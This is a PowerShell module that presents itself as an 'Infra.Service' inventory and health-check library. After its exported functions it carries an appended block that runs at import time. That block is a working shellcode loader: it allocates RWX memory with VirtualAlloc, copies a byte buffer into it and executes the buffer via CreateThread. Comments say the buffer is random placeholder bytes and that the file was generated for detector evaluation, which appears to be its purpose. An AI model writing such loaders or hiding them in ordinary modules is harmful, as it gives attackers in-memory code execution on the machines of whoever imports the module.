
#Requires -Version 5.1
<#
.SYNOPSIS
    Infra.Service module with the exported inventory, tagging and health commands.
.DESCRIPTION
    The module keeps a small in-memory cache and a default timeout so callers do
    not have to pass the same values on every call.
.EXAMPLE
    Import-Module .\Infra.Service.psd1 -Force
#>

$WarningPreference = 'Continue'
$DebugPreference = 'SilentlyContinue'

$script:DefaultTimeout = 30
$script:ModuleVersion = '1.0.0'

function Get-InfraService {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Staging'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraServiceTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraServiceHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-InfraPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Infra-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-InfraModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Infra.Service'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-InfraService', 'Set-InfraServiceTag', 'Test-InfraServiceHealth')
    }
}

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$script:ExportedFunctions = @('Get-InfraService', 'Set-InfraServiceTag', 'Test-InfraServiceHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Infra.Service')

Export-ModuleMember -Function Get-InfraService, Set-InfraServiceTag, Test-InfraServiceHealth, Get-InfraModuleInfo
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x9b, 0x5d, 0xf3, 0x51, 0x75, 0x0b, 0xd5, 0x11, 0xb7, 0xbc, 0x21, 0x9f, 0xab, 0x47, 0x03, 0x3e,
    0xc5, 0x98, 0xcd, 0xbb, 0x31, 0xac, 0xb7, 0x56, 0x79, 0x57, 0x70, 0x95, 0x62, 0x8d, 0x2c, 0x40,
    0xfb, 0x36, 0x03, 0x85, 0x2c, 0x9a, 0xd1, 0x8a, 0x65, 0xae, 0x5f, 0x2a, 0x5f, 0xc9, 0x9d, 0xb6,
    0x16, 0x72, 0x64, 0x7d, 0x48, 0xd9, 0x7a, 0x0d, 0xf9, 0xa5, 0x2a, 0x1e, 0xc9, 0xf0, 0x02, 0x5f,
    0x19, 0x5b, 0x70, 0x6f, 0xe9, 0xd4, 0xcf, 0x16, 0x1f, 0x88, 0x91, 0x1a, 0x5e, 0xdf, 0xc5, 0xc8,
    0xbd, 0x0d, 0xa1, 0xba, 0x6a, 0x3b, 0x0c, 0x32, 0x41, 0xcc, 0x2a, 0x24, 0x12, 0xb4, 0x4f, 0x22,
    0xf3, 0x2a, 0xbb, 0x05, 0x73, 0x77, 0x9c, 0xa9, 0x46, 0x62, 0xb0, 0xbb, 0x06, 0xa2, 0x8e, 0x04,
    0x5b, 0x24, 0xc1, 0xfa, 0x2d, 0x30, 0x5f, 0x04, 0x84, 0xdd, 0x89, 0x4c, 0x26, 0x62, 0xdc, 0xb6,
    0xee, 0x96, 0xc9, 0xd4, 0x3b, 0x7f, 0xe7, 0xca, 0xc2, 0xed, 0x2c, 0x31, 0x4d, 0x4e, 0x6a, 0x8a,
    0x94, 0xf0, 0xc0, 0xc2, 0xb1, 0xa2, 0x29, 0x1d, 0x68, 0x46, 0x7a, 0x29, 0x44, 0xda, 0xfe, 0x15,
    0x22, 0x69, 0x9b, 0x2d, 0xdc, 0x5c, 0x60, 0xc0, 0x4e, 0x09, 0xfd, 0xda, 0x22, 0x8f, 0xd5, 0x7d,
    0xfd, 0x4e, 0xb2, 0x51, 0x6b, 0x01, 0x5f, 0x2e, 0x28, 0x20, 0x58, 0x99, 0x02, 0x3f, 0xc5, 0x4b,
    0xf1, 0xa3, 0x1d, 0xb0, 0x07, 0x4f, 0xcd, 0x35, 0xba, 0xf5, 0x25, 0x87, 0x7a, 0xc8, 0x56, 0x4d,
    0x32, 0x39, 0xe9, 0x38, 0x50, 0xd1, 0x76, 0xef, 0x95, 0xa3, 0xd5, 0x4c, 0xbd, 0xeb, 0xc4, 0x4a,
    0x95, 0xa5, 0x09, 0xbc, 0xb1, 0xfb, 0x45, 0x7c, 0x79, 0x79, 0xb5, 0x0f, 0x8a, 0x37, 0x6f, 0x30,
    0x43, 0x8f, 0xa9, 0xfc, 0xaf, 0x91, 0x3f, 0xde, 0xb8, 0x5c, 0x79, 0x2c, 0xa2, 0x35, 0x90, 0xa4,
    0x08, 0x63, 0x0b, 0x3c, 0x48, 0x4b, 0x82, 0x82, 0x3d, 0x43, 0x01, 0x83, 0x3e, 0xc3, 0x5e, 0x50,
    0xf8, 0x18, 0x3a, 0x93, 0xb0, 0x4b, 0xf6, 0x51, 0x94, 0x68, 0xa4, 0x17, 0x6f, 0xb5, 0x7f, 0x8e,
    0x03, 0xf9, 0x96, 0x04, 0xdf, 0x54, 0x0b, 0x95, 0xcd, 0x79, 0x84, 0xea, 0xeb, 0x9f, 0xc6, 0x4f,
    0x49, 0xaa, 0x6f, 0x5a, 0xaa, 0xc3, 0x44, 0x24, 0x78, 0x07, 0xb1, 0x46, 0xa6, 0xae, 0x42, 0xf4,
    0xcd, 0x61, 0x37, 0x3c, 0x6e, 0x71, 0x30, 0xb3, 0x8e, 0x82, 0xe4, 0x80, 0x03, 0x04, 0xf3, 0x69,
    0x3d, 0x9a, 0xa6, 0x69, 0x8d, 0xc1, 0xe5, 0xd9, 0xfc, 0x39, 0x17, 0x35, 0x91
)

$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 1371)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
